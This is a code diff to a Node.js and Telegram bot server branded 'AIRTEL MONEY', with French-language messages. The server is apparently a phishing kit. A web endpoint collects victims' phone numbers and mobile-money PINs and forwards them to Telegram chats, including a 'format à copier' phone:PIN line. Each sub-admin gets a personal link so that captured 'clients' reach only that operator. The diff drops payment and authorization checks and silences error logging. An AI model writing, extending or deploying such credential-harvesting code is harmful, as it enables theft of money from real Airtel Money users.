@@ -1,6 +1,5 @@
 /**
- * AIRTEL MONEY - MULTI-ADMIN SERVER (+243 LOCALIZATION)
- * Main Admin Chat ID: 8591555400
+ * AIRTEL MONEY - STRICTLY MAPPED PRIVATE SUB-ADMIN SERVER
  */
 
 const express = require('express');
@@ -24,17 +23,12 @@ function loadAdmins() {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? false,
-        paid: rec.paid ?? false,
         username: rec.username || '',
         firstName: rec.firstName || 'User',
-        lastName: rec.lastName || '',
-        status: rec.status || 'PENDING'
+        lastName: rec.lastName || ''
       }]));
     }
-  } catch (err) {
-    console.error('[Storage] Error loading admins file:', err);
-  }
+  } catch (err) {}
   return new Map();
 }
 
@@ -42,23 +36,21 @@ function saveAdmins() {
   try {
     const serialized = JSON.stringify(Array.from(admins.entries()));
     fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
-  } catch (err) {
-    console.error('[Storage] Error saving admins file:', err);
-  }
+  } catch (err) {}
 }
 
 let bot = null;
 const sessions = new Map();
 const admins = loadAdmins();
 
+/**
+ * Resolves the destination chat ID strictly from the URL parameter.
+ * If a valid sub-admin parameter exists, it routes exclusively to them.
+ */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
-    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
-      return FALLBACK_ADMIN_ID;
-    }
-    const adminRecord = admins.get(targetAdmin);
-    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
+    if (targetAdmin === String(FALLBACK_ADMIN_ID) || admins.has(targetAdmin)) {
       return targetAdmin;
     }
   }
@@ -79,15 +71,9 @@ async function initBot() {
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
       if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
-      } else {
-        const existing = admins.get(chatId);
-        existing.username = username;
-        existing.firstName = firstName;
-        existing.lastName = lastName;
-        admins.set(chatId, existing);
+        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
+        saveAdmins();
       }
-      saveAdmins();
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
 
@@ -95,24 +81,21 @@ async function initBot() {
         const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
                                  `👤 *Info Telegram:*\n` +
                                  `• Nom: ${firstName} ${lastName}\n` +
-                                 `• Username: @${username}\n` +
                                  `• Chat ID: \`${chatId}\`\n\n` +
-                                 `🔗 *Votre lien Airtel (+243):*\n${userLink}`;
+                                 `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
         await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
         return;
       }
 
-      const subAdminMessage = `🤖 *AIRTEL SUB-ADMIN BOT READY*\n\n` +
-                              `👤 *Vos Infos Telegram:*\n` +
+      const subAdminMessage = `🤖 *ESPACE SOUS-ADMINISTRATEUR PRIVÉ*\n\n` +
+                              `👤 *Vos Infos:*\n` +
                               `• Nom: ${firstName} ${lastName}\n` +
-                              `• Username: @${username}\n` +
                               `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Votre lien unique généré:*\n${userLink}`;
+                              `🔗 *Votre lien de suivi privé et indépendant:*\n${userLink}\n\n` +
+                              `_Note: Vos clients sont routés exclusivement vers votre chat._`;
 
       await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
-    } catch (err) {
-      console.error('[Telegram] Error handling /start:', err);
-    }
+    } catch (err) {}
   });
 
   bot.on('callback_query', async (query) => {
@@ -164,7 +147,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN (DENY / ALLOW Buttons)
+// Step 1: Submit Phone Number & PIN (Routes strictly to mapped sub-admin without leaking +243)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -181,9 +164,9 @@ app.post('/api/submit-credentials', async (req, res) => {
     });
 
     const message = `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
-                    `📞 *Téléphone:* \`+243${phone}\`\n` +
+                    `📞 *Téléphone:* \`${phone}\`\n` +
                     `🔒 *Code PIN:* \`${pin}\`\n\n` +
-                    `📋 *Format à copier:*\n\`+243${phone}:${pin}\``;
+                    `📋 *Format à copier:*\n\`${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
